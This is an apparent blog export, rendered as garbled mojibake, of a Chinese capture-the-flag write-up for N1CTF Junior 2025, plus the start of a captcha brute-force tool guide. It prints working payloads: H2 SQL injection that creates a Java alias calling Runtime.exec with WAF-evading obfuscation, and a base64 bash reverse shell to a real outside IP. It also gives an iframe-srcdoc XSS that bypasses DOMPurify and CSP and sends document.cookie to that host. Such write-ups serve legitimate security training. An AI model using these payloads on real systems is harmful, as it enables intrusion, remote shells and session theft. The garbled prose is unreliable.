ï¼Œå’Œæ­£å¸¸çš„Javaè¯­å¥æ²¡æœ‰ä»€ä¹ˆå´æ¯”ï¼Œç»•çš„è¯è¿˜æ˜¯å¾ˆå¥½ç»•çš„ï¼Œå¯ä»¥ä½¿ç”¨unicodeç¼–ç å…³é”®å­—+åå°„æ¥è¿›è¡Œå°è¯•ï¼š\n1 2 3 4 5 6 7 8 9 //åˆ›å»ºåˆ«åï¼Œå…¶å®å°±æ˜¯åˆ›å»ºä¸€ä¸ªæ‰§è¡Œå‡½æ•°ï¼š CREATE ALIAS CMD AS $$ String cmd(String cmd) throws java.io.IOException { Class clazz= Class.forName(\u0026#34;java.lang.R\\u0075ntime\u0026#34;); java.lang.reflect.Method mGet = clazz.getDeclaredMethod(\u0026#34;getR\\u0075ntime\u0026#34;); Object gettime = mGet.invoke(null); java.lang.reflect.Method exee = gettime.getClass().getDeclaredMethod(\u0026#34;e\\u0078ec\u0026#34;,String.class); exee.invoke(gettime,cmd);}$$; CALL CMD(\u0026#39;whoami\u0026#39;); ç„¶åç®€å•ç²¾ç®€ä¸€ä¸‹ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 //åˆ›å»ºåˆ«åï¼Œå…¶å®å°±æ˜¯åˆ›å»ºä¸€ä¸ªæ‰§è¡Œå‡½æ•°ï¼š CREATE ALIAS CMD AS $$ String cmd(String cmd) throws java.io.IOException { Object gettime = Class.forName(\u0026#34;java.lang.R\\u0075ntime\u0026#34;).getDeclaredMethod(\u0026#34;getR\\u0075ntime\u0026#34;).invoke(null); gettime.getClass().getDeclaredMethod(\u0026#34;e\\u0078ec\u0026#34;,String.class).invoke(gettime,cmd);}$$; CALL CMD(\u0026#39;whoami\u0026#39;); å°è¯•å¦‚ä¸‹æ„é€ ï¼Œç„¶åæ‹¼æ¥å¦‚ä¸‹ï¼š\n1 2 3 SELECT * FROM users WHERE username = \u0026#39;admin\u0026#39;; CREATE ALIAS CMD AS $$ String cmd(String cmd) throws java.io.IOException { Object gettime = Class.forName(\u0026#34;java.lang.R\\u0075ntime\u0026#34;).getDeclaredMethod(\u0026#34;getR\\u0075ntime\u0026#34;).invoke(null); gettime.getClass().getDeclaredMethod(\u0026#34;e\\u0078ec\u0026#34;,String.class).invoke(gettime,cmd);}$$; CALL CMD(\u0026#39;whoami\u0026#39;); --\u0026#39; AND password = \u0026#39;%s\u0026#39; è¿™é‡Œæ˜¯æˆ‘æ˜¯æ”¹æˆäº†æ²¡æœ‰å›æ˜¾çš„ï¼Œç›´æ¥åœ¨å¼¹ä¸ªshellå³å¯ï¼š\n1 2 admin\u0026#39;; CREATE ALIAS CMD AS $$ String cmd(String cmd) throws Exception { Class clazz= Class.forName(\u0026#34;java.lang.R\\u0075ntime\u0026#34;);java.lang.reflect.Method mGet = clazz.getDeclaredMethod(\u0026#34;getR\\u0075ntime\u0026#34;);Object gettime = mGet.invoke(null);java.lang.reflect.Method exee = gettime.getClass().getDeclaredMethod(\u0026#34;e\\u0078ec\u0026#34;,String.class);exee.invoke(gettime,cmd);return \u0026#34;123\u0026#34;; }$$; CALL CMD(\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMjIzLjE3My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\u0026#34;); -- æ²¡å¼¹ä¸Šï¼Œç›´æ¥è¢«è§£ææˆäº†execå…³é”®å­—ï¼Ÿå¯èƒ½å°±æ˜¯è¿™ä¸ªåŸå› ï¼Œè¢«wafäº†ã€‚çœ‹äº†ä¸€ä¸‹å…¶ä»–è§£æ³•ï¼Œè¿™é‡Œè¿˜å¯ä»¥ä½¿ç”¨æ‹¼æ¥ï¼Œæ¯”å¦‚ï¼š\n1 2 admin\u0026#39;; CREATE ALIAS CMD AS $$ void cmd(String cmd) throws Exception { String name = \u0026#34;Run\u0026#34;+\u0026#34;time\u0026#34;;Class clazz= Class.forName(\u0026#34;java.lang.\u0026#34;+name);java.lang.reflect.Method mGet = clazz.getDeClaredMethod(\u0026#34;get\u0026#34;+name);Object gettime = (Object)mGet.invoke(null);gettime.getClass().getDeclaredMethod(\u0026#34;ex\u0026#34;+\u0026#34;ec\u0026#34;,String.class).invoke(gettime,cmd);}$$; CALL CMD(\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMjIzLjE3My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\u0026#34;); -- ä½†æ˜¯æ„é€ çš„è¯­å¥æ€»æ˜¯æœ‰é—®é¢˜ï¼Œç›´æ¥ç”¨åˆ«äººçš„äº†ï¼Œå¤§æ¦‚å¦‚ä¸‹ï¼š\n1 admin\u0026#39;; CREATE ALIAS evil AS $$void jerry(String cmd) throws Exception{ String R=\u0026#34;R\u0026#34;+\u0026#34;untime\u0026#34;;Class\u0026lt;?\u0026gt; c = Class.forName(\u0026#34;java.lang.\u0026#34;+R);Object rt=c.getMethod(\u0026#34;get\u0026#34;+R).invoke(null);c.getMethod(\u0026#34;exe\u0026#34;+\u0026#34;c\u0026#34;,String.class).invoke(rt,cmd);}$$;CALL evil(\u0026#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMjIzLjE3My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\u0026#39;);-- ç¡®å®æˆåŠŸå¼¹èµ·äº†ï¼Œå¯¹æ¯”äº†ä¸€ä¸‹ï¼Œé—®é¢˜å¯èƒ½å­˜åœ¨äºç±»å‹è½¬æ¢çš„é—®é¢˜ã€‚ä¿®ä¿®æ”¹æ”¹è‡ªå·±çš„pocï¼Œè¿˜æ˜¯æ‰“ä¸å‡ºæ¥ï¼Œä¸å¤šçº ç»“äº†ã€‚è¿˜å¯ä»¥base64ç¼–ç è¿™æ ·æ‰“ï¼š\n1 \u0026#39;;CREATE ALIAS hello AS $$ String hello() throws Exception { Class c = Class.forName(new String(java.util.Base64.getDecoder().decode(\u0026#34;amF2YS5sYW5nLlJ1bnRpbWU=\u0026#34;)));java.lang.reflect.Method m1 = c.getMethod(new String(java.util.Base64.getDecoder().decode(\u0026#34;Z2V0UnVudGltZQ==\u0026#34;)));Object o = m1.invoke(null);java.lang.reflect.Method m2 = c.getMethod(new String(java.util.Base64.getDecoder().decode(\u0026#34;ZXhlYw==\u0026#34;)), String[].class);m2.invoke(o, new Object[]{new String[]{\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, new String(java.util.Base64.getDecoder().decode(\u0026#34;YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMjIzLjE3My8yMzMzIDA+JjE=\u0026#34;))}});return null; }$$; CALL hello();-- æœ€åæ‰“å°±è¡Œäº†ï¼š\næ³¨æ„urlç¼–ç ï¼Œä»¥åŠè¿™ä¸ªåˆ«ååº”è¯¥åªèƒ½åˆ›ä¸€æ¬¡ï¼Œå¦åˆ™éœ€è¦é‡æ–°å¼€ç¯å¢ƒã€‚æœ€åæ‹¿åˆ°flagï¼š\nâ€”â€”â€”â€”â€”â€”\nå‚è€ƒï¼š\nhttps://j1rry-learn.github.io/posts/2025-n1ctf-junior-web-%E6%96%B9%E5%90%91%E5%85%A8%E8%A7%A3/#gavatar\ndisplay hintï¼šç”¨iframeåµŒå…¥å­é¡µé¢å¯ä»¥é‡æ–°å”¤èµ·DOMè§£æå™¨è§£æscriptæ ‡ç­¾\nâ€”â€”â€”â€”â€”â€”\nåŒæ ·æ˜¯ç»™äº†dockeræºç çš„ï¼Œnode.jsã€‚å®¡è®¡æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°åŒæ ·æ˜¯ä¸€ä¸ªXSSæ“ä½œï¼Œç„¶åæœ‰cspé™åˆ¶ï¼š\n1 2 3 4 5 6 const csp = \u0026#34;script-src \u0026#39;self\u0026#39;; object-src \u0026#39;none\u0026#39;; base-uri \u0026#39;none\u0026#39;;\u0026#34;; app.use((req, res, next) =\u0026gt; { res.setHeader(\u0026#39;Content-Security-Policy\u0026#39;, csp); next(); }); app.jsæ–‡ä»¶å†…å®¹ï¼Œå¯ä»¥çŸ¥é“ä¼šå°†æ‰€æœ‰çš„è·¯ç”±éƒ½è®¾ç½®ä¸Šäº†è¿™ä¸ªé™åˆ¶ã€‚\nçœ‹app.jsæ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯å¯¹404é¡µé¢è¿›è¡Œäº†å¤„ç†çš„ï¼š\n1 2 3 app.use((req, res) =\u0026gt; { res.status(200).type(\u0026#39;text/plain\u0026#39;).send(`${decodeURI(req.path)} : invalid path`); }); // 404 é¡µé¢ è¿™é‡Œå’ŒSekaiCTF 2024 Taglessé¢˜å¾ˆåƒã€‚é‚£ä¹ˆç°åœ¨æ¥çœ‹ä¸€ä¸‹å›æ˜¾ï¼š\nä½†æ˜¯å¹¶ä¸èƒ½è§£æä¸ºjsä»£ç ï¼š\næ§åˆ¶å°ä¹Ÿæ²¡æœ‰çœ‹åˆ°CSPé™åˆ¶çš„æŠ¥é”™ã€‚\nå†ç»§ç»­çœ‹ä»£ç ï¼Œè¿˜å¯ä»¥çœ‹åˆ°æœ‰å‘botå‘èµ·è¯·æ±‚çš„åœ°æ–¹ï¼š\nè·Ÿè¿›visit()å°±åˆ°äº†botçš„å®šä¹‰ä»£ç ï¼Œä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 const puppeteer = require(\u0026#39;puppeteer\u0026#39;); const HOST = \u0026#39;localhost:3000\u0026#39;; const FLAG = process.env.FLAG ?? \u0026#39;flag{test}\u0026#39;; function sleep(ms) { return new Promise(resolve =\u0026gt; setTimeout(resolve, ms)); } const visit = async (text) =\u0026gt; { const browser = await puppeteer.launch({ headless: true, args: [\u0026#39;--no-sandbox\u0026#39;, \u0026#39;--disable-setuid-sandbox\u0026#39;] }); await browser.setCookie({ name: \u0026#39;flag\u0026#39;, value: FLAG, domain: HOST, path: \u0026#39;/\u0026#39;, httpOnly: false }); const page = await browser.newPage(); await page.goto(`http://${HOST}/?text=${encodeURI(text)}`); await sleep(5000); await page.close(); } module.exports = {visit}; å¯ä»¥çœ‹åˆ°ä¼šåœ¨botä¸­å¸¦ä¸Šflagã€‚ç„¶åè®¾ç½®äº†httponlyä¸ºfalseï¼Œå¯ä»¥é€šè¿‡XSSæ¥è·å–ã€‚å¹¶ä¸”è¿™é‡Œbotçš„è®¿é—®é€»è¾‘æ˜¯åªè®¿é—®/è·¯ç”±å¹¶å¸¦ä¸Šæˆ‘ä¼ å‚çš„textï¼Œè¿™é‡Œå°±æ˜¯éœ€è¦åˆ©ç”¨çš„ç‚¹ã€‚\nç°åœ¨æ¥çœ‹å‰ç«¯å¼•ç”¨çš„jsï¼Œæ˜¯ä¸€ä¸ªDOMå‹XSSï¼š\nè·å–textå‚æ•°ï¼Œç„¶åå°†å…¶base64è§£ç åå†æ£€éªŒä¸€ä¸‹ï¼Œcheckçš„å‡½æ•°å†…å®¹ä¸ºï¼š\n1 2 3 4 5 6 7 function sanitizeContent(text) { // Only allow \u0026lt;h1\u0026gt;, \u0026lt;h2\u0026gt;, tags and plain text const config = { ALLOWED_TAGS: [\u0026#39;h1\u0026#39;, \u0026#39;h2\u0026#39;] }; return DOMPurify.sanitize(text, config); } è¿™é‡Œåˆ©ç”¨åˆ°äº†DOMPurifyæ¥æ£€éªŒï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äºæ¸…ç†HTMLã€MathMLå’ŒSVGçš„JavaScriptçš„åº“ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ç”¨æ¥é˜²èŒƒXSSæ”»å‡»ã€‚æœç´¢è¿™ä¸ªåº“çš„æ¼æ´ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹æ–‡ç« ï¼š\nã€Šåˆ©ç”¨çªå˜XSSç»•è¿‡DOMPurify 2.0.0 ã€‹\nä½†æ˜¯æˆ‘ä»¬è¿™é‡Œç‰ˆæœ¬ä¸ºDOMPurify 3.2.3ï¼Œç°åœ¨å¹¶æ²¡æœ‰ç°æˆçš„POCæ¥æ‰“ã€‚\nåœ¨index.jsæ–‡ä»¶ä¸­ï¼Œæœ‰ä¸€ä¸ªç‚¹å€¼å¾—æ³¨æ„ä¸€ä¸‹ï¼š\n1 2 textInput.innerHTML = sanitizedText; // å†™å…¥é¢„è§ˆåŒº contentDisplay.innerHTML = textInput.innerText; // å†™å…¥æ•ˆæœæ˜¾ç¤ºåŒº è¿™é‡Œæåˆ°äº†innerHTMLå’ŒinnerTextï¼Œç”¨ä¸€ä¸ªä»£ç æ¥è¯´æ˜è¿™ä¸¤ä¸ªä¹‹é—´çš„åŒºåˆ«ï¼š\n1 2 3 4 5 6 7 8 9 \u0026lt;div id=\u0026#34;example\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Hello \u0026lt;strong\u0026gt;World\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var content = document.getElementById(\u0026#34;example\u0026#34;); console.log(content.innerHTML); console.log(content.innerText); \u0026lt;/script\u0026gt; è¾“å‡ºä¸ºï¼š\n1 2 3 \u0026lt;p\u0026gt;Hello \u0026lt;strong\u0026gt;World\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; Hello World ç„¶åç¨å¾®æ”¹ä¸€ç‚¹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 \u0026lt;div id=\u0026#34;example\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Hello \u0026amp;lt;strong\u0026amp;gt;World\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var content = document.getElementById(\u0026#34;example\u0026#34;); console.log(content.innerHTML); console.log(content.innerText); \u0026lt;/script\u0026gt; è¾“å‡ºä¸ºï¼š\n1 2 3 \u0026lt;p\u0026gt;Hello \u0026amp;lt;strong\u0026amp;gt;World\u0026lt;/p\u0026gt; Hello \u0026lt;strong\u0026gt;World ä»ä¸¤ä¸ªç»“æœçš„å¯¹æ¯”ï¼Œå¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œçš„innerHTMLç”¨äºè·å–æˆ–è®¾ç½®å…ƒç´ çš„ HTML å†…å®¹ï¼ŒåŒ…æ‹¬æ‰€æœ‰çš„ HTML æ ‡ç­¾ï¼Œè€ŒinnerTextåˆ™æ˜¯ä¼šè§£æHTMLæ ‡ç­¾ä¸ºæ–‡æœ¬ï¼Œå¦‚æœæœ‰HTMLç¼–ç å†…å®¹ï¼Œé‚£ä¹ˆå°±ä¼šå°†å…¶è§£ç ä¸€æ¬¡ã€‚å¯ä»¥æµ…æ˜¾ç†è§£ä¸ºinnerHTMLå°±æ˜¯è·å–å…¨éƒ¨HTMLæ ‡ç­¾çš„å†…å®¹ï¼Œè€ŒinnerTextåˆ™æ˜¯HTMLæ¸²æŸ“ä¸€æ¬¡ï¼Œç±»ä¼¼äºå‰ç«¯æ¸²æŸ“çš„æ•ˆæœã€‚\né‚£ä¹ˆè¿™æ ·çœ‹æ¥ï¼Œæºä»£ç æ˜¯å­˜åœ¨æ¼æ´çš„ï¼Œå†ç²˜è¿‡æ¥ä¸€ä¸‹ï¼š\n1 2 textInput.innerHTML = sanitizedText; // å†™å…¥é¢„è§ˆåŒº contentDisplay.innerHTML = textInput.innerText; // å†™å…¥æ•ˆæœæ˜¾ç¤ºåŒº åœ¨è¿™é‡Œï¼Œå¯ä»¥å°è¯•å°†sanitizedTextçš„å†…å®¹HTMLç¼–ç ä¸€ä¸‹ï¼Œç„¶åtextInput.innerTextä¼šå°†å…¶æ¸²æŸ“ï¼Œä¹Ÿå°±æ˜¯HTMLè§£ç ä¸€æ¬¡ã€‚å¹¶å°†å…¶èµ‹å€¼ç»™äº†å†…å®¹æ˜¾ç¤ºï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨å‰ç«¯æ˜¾ç¤ºä¸€ä¸ªHTMLæ ‡ç­¾å‡ºæ¥ï¼Œå°è¯•å¦‚ä¸‹ï¼š\nç¼–ç ï¼š\nç„¶åbase64ç¼–ç ä¸€æ¬¡ä¼ è¿›å»ã€‚\næˆåŠŸæ¸²æŸ“ï¼š\nè¿™é‡Œåœ¨é¢„è§ˆæ—¶å°±åœ¨å‰ç«¯æ¸²æŸ“æˆäº†ä¸€ä¸ªæ ‡ç­¾ã€‚ä½†æ˜¯ä¸ä¼šè§£æã€‚\nç»è¿‡å‰é¢çš„æ„é€ ï¼Œé‚£ä¹ˆcontentDisplayå‰ç«¯æ¸²æŸ“æ—¶å°±ä¼šè¢«æ¸²æŸ“ä¸ºjsæ ‡ç­¾ï¼š\nä½†æ˜¯å¹¶æ²¡æœ‰è§£æï¼Œè¿™é‡Œä¸»è¦çš„åˆ©ç”¨ç‚¹åœ¨contentDisplayï¼Œé€šè¿‡å°†contentDisplay.innerHTMLè®¾ç½®ä¸ºä¸€ä¸ªæ­£å¸¸çš„htmlæ ‡ç­¾ï¼Œè¿™æ ·å‰ç«¯æ¸²æŸ“æ—¶å°±ä¼šå°†å…¶è§£æã€‚ï¼ˆè¿™æ®µä»£ç è®¾è®¡å¾—ç§’å‘€ï¼‰\néƒ½æ˜¯æ²¡æœ‰è§£æã€‚é‚£ä¹ˆçœ‹æ­¤æ—¶çš„Hintï¼šç”¨iframeåµŒå…¥å­é¡µé¢å¯ä»¥é‡æ–°å”¤èµ·DOMè§£æå™¨è§£æscriptæ ‡ç­¾ã€‚\né‚£ä¹ˆæ˜¯é™åˆ¶äº†\u0026lt;script\u0026gt;æ ‡ç­¾çš„è§£æï¼Ÿ\nå°è¯•ä¸€ä¸‹åœ¨404é¡µé¢ä½¿ç”¨\u0026lt;iframe\u0026gt;æ ‡ç­¾åµŒå…¥å‰é¢çš„/è·¯ç”±ï¼š\nä¼¼ä¹æ˜¯å› ä¸º?è¿™ä¸ªgetä¼ å‚ç¬¦å·åé¢å…¨éƒ½è¢«èˆå¼ƒäº†ï¼Ÿé‚£ä¹ˆåµŒå¥—ä¸€ä¸‹404é¡µé¢ï¼š\nè¿˜æ˜¯ä¸è¡Œï¼ŒåŒæ—¶ï¼Œ\u0026lt;iframe\u0026gt;æ ‡ç­¾çš„srcå±æ€§è¿˜å¯ä»¥ç›´æ¥åµŒå¥—javascriptåè®®æ¥ç›´æ¥æ‰§è¡Œä»£ç ï¼Œå¦‚ï¼š\n1 \u0026lt;iframe src=\u0026#34;javascript:alert(1)\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; åŒæ ·çš„è¿˜æœ‰\u0026lt;iframe\u0026gt;è¿˜æœ‰ä¸€ä¸ªsrcdocå±æ€§ï¼Œè¿™ä¸ªå±æ€§å¯ä»¥ç›´æ¥å¼•å…¥\u0026lt;script\u0026gt;æ ‡ç­¾ï¼Œå¦‚ï¼š\n1 \u0026lt;iframe srcdoc=\u0026#34;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; å¹¶ä¸”ä¸å—frame-srcçš„å½±å“ï¼Œè™½ç„¶è¿™é“é¢˜çš„CSPæ²¡æœ‰è®¾ç½®frame-srcï¼Œä½†æ˜¯å¯ä»¥æ³¨æ„ä¸€ä¸‹ï¼Œéå¸¸çš„å¥½ç”¨ã€‚\nä½†æ˜¯åœ¨è¿™é‡Œéƒ½æ²¡æœ‰è§£æã€‚\nå¯¹äº\u0026lt;iframe\u0026gt;æ ‡ç­¾çš„åˆ©ç”¨ï¼Œå¦‚ä¸‹æ–‡ç« è¯´çš„æ¯”è¾ƒæ¸…æ¥šï¼š\nhttps://blog.huli.tw/2022/04/07/iframe-and-window-open/#iframe-%E7%9A%84-csp\nè¿˜æ˜¯ä¸ä¼šå‘€ï¼Œçœ‹äº†ä¸€ä¸‹åˆ«äººçš„wpï¼Œæ˜¯åœ¨/è·¯ç”±è¿›è¡Œçš„å¼¹çª—ï¼Œå”‰ï¼Œæ€ç»´è¿˜æ˜¯å®šå¼äº†ï¼Œè¿˜æ˜¯æƒ³ç€sekaictfçš„é‚£å¥—æ‰“æ³•ï¼Œé‚£ä¹ˆå¦‚ä¸‹æ‰“ï¼ˆå¯ä»¥ç›´æ¥æ‰“srcï¼Œä¹Ÿå¯ä»¥æ‰“srcdocï¼‰ï¼š\n1 \u0026lt;iframe srcdoc=\u0026#34;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; ç”¨è¿™ä¸ªpayloadï¼Œè¿˜æ˜¯ä¹‹å‰çš„æ“ä½œï¼ŒHTMLç¼–ç ï¼Œç„¶åbase64ç¼–ç ã€‚\n1 http://localhost:53447/?text=Jmx0O2lmcmFtZSBzcmNkb2M9IiZsdDtoMSZndDtoZWxsbyZsdDsvaDEmZ3Q7Jmx0O3NjcmlwdCZndDthbGVydCgxKSZsdDsvc2NyaXB0Jmd0OyImZ3Q7Jmx0Oy9pZnJhbWUmZ3Q7 æœ€åæ•ˆæœå¦‚ä¸‹ï¼š\næŠ¥é”™äº†ï¼Œé‚£ä¹ˆç°åœ¨å°±æ˜¯CSPç»•è¿‡äº†ï¼Œscript-srcè®¾ç½®ä¸ºäº†selfã€‚è¿™ä¸ªå°±æ˜¯sekaictf 2024çš„ç†Ÿæ‚‰æ“ä½œäº†ï¼Œè¿™é‡Œç›´æ¥åˆ©ç”¨404é¡µé¢æ„é€ å³å¯ï¼Œè¿˜æ˜¯é‚£ä¸ªæ“ä½œï¼Œæœ¬åœ°å¼•ç”¨ï¼Œå‰é¢é—­åˆæˆå¤šè¡Œæ³¨é‡Šç¬¦ï¼Œåé¢ç›´æ¥çš„é‚£è¡Œæ³¨é‡Šæ‰ï¼Œç•™ä¸€ä¸ªå®Œæ•´çš„jsä»£ç ï¼Œè¿˜æ˜¯ç”¨fetch()å‡½æ•°ï¼š\nç„¶åè®©iframeæ¥è‡ªå·±å¼•å…¥è¿™ä¸ªé¡µé¢ï¼š\n1 \u0026lt;iframe srcdoc=\u0026#34;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026lt;script src=\u0026#34;/**/fetch(\u0026#39;http://47.100.223.173:2333/\u0026#39;+document.cookie)//\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; ç„¶åè¿˜æ˜¯æ²¡å¼¹æˆåŠŸï¼ŒçŒœæ˜¯ä¸æ˜¯è¿™é‡Œä¸¤ä¸ªåŒå¼•å·å¯¼è‡´ç›´æ¥å‡ºé”™äº†ï¼Œfetch()å‡½æ•°è¿˜å¯ä»¥ä½¿ç”¨åå¼•å·ï¼ˆ`ï¼‰æŒ‡å®šåœ°å€ï¼Œæ”¹æˆå¦‚ä¸‹è¿™ä¸ªå³å¯ï¼š\n1 \u0026lt;iframe srcdoc=\u0026#34;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026lt;script src=\u0026#39;/**/fetch(`http://47.100.223.173:2333/`+document.cookie)//\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; ç„¶åè¿˜æ˜¯ä¹‹å‰çš„æ“ä½œï¼ŒHTMLç¼–ç ååœ¨base64ç¼–ç ï¼Œæ³¨æ„è¦æŠ“åŒ…ä¼ å‚ï¼Œå¦åˆ™æµè§ˆå™¨ä¼šurlç¼–ç ä¸€æ¬¡ï¼Œå¯¼è‡´æ— æ³•æˆåŠŸï¼š\næœ€åæˆåŠŸæ‹¿åˆ°flagï¼š\nâ€”â€”â€”â€”\næ€»ç»“ï¼šå¾ˆæœ‰æ„æ€çš„ä¸€é“é¢˜ï¼Œæˆ‘è¿˜å¾—ç»ƒå‘€ï¼Œè¿˜æ˜¯åº”è¯¥æƒ³åˆ°è¿˜æœ‰/è·¯ç”±æœ‰å‰ç«¯æ¸²æŸ“çš„æ“ä½œï¼Œæ€ç»´è¿˜å¾—å†å¼€ç‚¹ã€‚\néƒ¨åˆ†å‡ºé¢˜äººçš„wpï¼š\nhttps://gist.github.com/X1r0z/0c6a4323fd600a07091d6392cb9c77b5\n","date":"2025-02-17T00:19:41+08:00","permalink":"https://fupanc-w1n.github.io/p/n1ctf-junior-2025/","title":"N1CTF Junior 2025"},{"content":"éªŒè¯ç çˆ†ç ´ ç°åœ¨å¶å°”é‡åˆ°éªŒè¯ç çˆ†ç ´è¿™ä¸œè¥¿äº†ï¼Œè¿™é‡Œè¿˜æ˜¯æ¥è®°å½•ä¸€ä¸‹é…ç½®åŠä½¿ç”¨æ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸ªçˆ†ç ´æ–¹æ³•ä¹Ÿåªåœ¨ä¸€å®šæƒ…å†µä¸‹ä½¿ç”¨ã€‚\nå¯¹äºéªŒè¯ç çš„å…¶ä»–æƒ…å†µï¼Œå¯ä»¥çœ‹ä¸€çœ‹ç¬¬ä¸‰ä¸ªå‚è€ƒæ–‡ç« ã€‚\ncaptcha-killer-modified å·¥å…·é…ç½® ä¸€ä¸ªburpæ’ä»¶ï¼Œåœ°å€ï¼šhttps://github.com/f0ng/captcha-killer-modified/releases/tag/0.24.3\nå…ˆåœ¨ç»™çš„å·¥å…·åœ°å€é€‰ä¸‹è½½ä¸å¯åŠ¨burpçš„javaç‰ˆæœ¬é€‚é…çš„jaråŒ…ï¼Œæˆ‘è¿™é‡Œæ˜¯ç›´æ¥çœ‹çš„æœ¬åœ°javaç‰ˆæœ¬ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥é€‰æ‹©java8å³å¯ï¼š\nç„¶åéœ€è¦é…ç½®ä¸€ä¸‹pythonçš„ç¯å¢ƒï¼Œè¿™é‡Œéœ€è¦å®‰è£…å¦‚ä¸‹çš„åº“ï¼š\n1 2 3 4 5 flask ddddocr Pillow==9.5.0 aiohttp==3.8.3 argparse==1.1 ç›´æ¥å°†å…¶å†™å…¥åˆ°ä¸€ä¸ªrequirements.txtæ–‡ä»¶ä¸€æ­¥ä¸‹è½½å³å¯ï¼Œè¿™é‡Œæˆ‘ç”¨çš„pythonçš„ç‰ˆæœ¬æ˜¯python3.8ï¼Œå†™å¥½åç›´æ¥å¦‚ä¸‹å®‰è£…å³å¯ï¼š\n1 pip38 install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple åé¢ä½¿ç”¨æ—¶ä¼šä½¿ç”¨å¦‚ä¸‹è„šæœ¬ï¼Œç°åœ¨å…ˆä¸è¯´ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # -*- encoding=utf-8 -*- import argparse import ddddocr from aiohttp import web ocr = ddddocr.DdddOcr() async def handle_cb(request): return web.Response(text=ocr.classification(await request.text())) app = web.Application() app.add_routes([web.post(\u0026#39;/reg\u0026#39;, handle_cb)]) if __name__ == \u0026#39;__main__\u0026#39;: web.run_app(app,host=\u0026#39;127.0.0.1\u0026#39;,port=8881) ç„¶åå°±æ˜¯åœ¨burpä¸Šé…ç½®ä¸€ä¸‹æ’ä»¶ï¼Œç›´æ¥åœ¨ä¸Šè¾¹æ æ‰¾åˆ°extensionï¼Œç„¶åå¦‚ä¸‹é…ç½®å³å¯ï¼š\nå¦‚ä¸‹å°±æ˜¯é…ç½®å¥½äº†ï¼š\nåé¢å°±ç›´æ¥ç”¨ä¸€é“é¢˜æ¥è¯´æ˜åé¢è¯¥æ€ä¹ˆç”¨ã€‚\nä¾‹é¢˜è¯´æ˜ 2024å›½åŸæ¯ez_Gallery è¿™é‡Œå°±ç®€å•è¯´è¯´éªŒè¯ç çˆ†ç ´çš„æ­¥éª¤ï¼Œåç»­çš„è§£é¢˜å°±ä¸è¯´äº†ã€‚\nå¼€é¢˜å¦‚ä¸‹ï¼š\nå¯ä»¥çœ‹å‡ºæ¥å°±æ˜¯ä¸€ä¸ªç™»å½•æ¡†+éªŒè¯ç ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸ªéªŒè¯ç çš„ç”Ÿæˆæƒ…å†µï¼š\nç»æµ‹è¯•å‘ç°æ˜¯é€šè¿‡ä¸€ä¸ªurlå¯æŸ¥çœ‹ï¼Œå¹¶ä¸”è¿™é‡Œåˆ·æ–°ä¸€æ¬¡æ¢ä¸€ä¸ªéªŒè¯ç ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ç›´æ¥å°†å…¶å‘é€ç»™burpï¼Œå¹¶ç”¨captchaæ¥è·å–:\nç„¶åå»åˆ°æ’ä»¶é¡µé¢ï¼Œç‚¹å‡»è·å–ï¼Œå¾—åˆ°éªŒè¯ç å³ä¸ºæˆåŠŸï¼ˆè¿™é‡Œè¯†åˆ«åˆ°äº†éªŒè¯ç ï¼Œä½†æ˜¯ä¸ç”¨ç®¡ï¼Œç»§ç»­è·Ÿç€åé¢èµ°å°±è¡Œï¼‰ï¼š\nç„¶åå¯åŠ¨å‰é¢çš„pythonè„šæœ¬ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # -*- encoding=utf-8 -*- import argparse import ddddocr from aiohttp import web ocr = ddddocr.DdddOcr() async def handle_cb(request): return web.Response(text=ocr.classification(await request.text())) app = web.Application() app.add_routes([web.post(\u0026#39;/reg\u0026#39;, handle_cb)]) if __name__ == \u0026#39;__main__\u0026#39;: 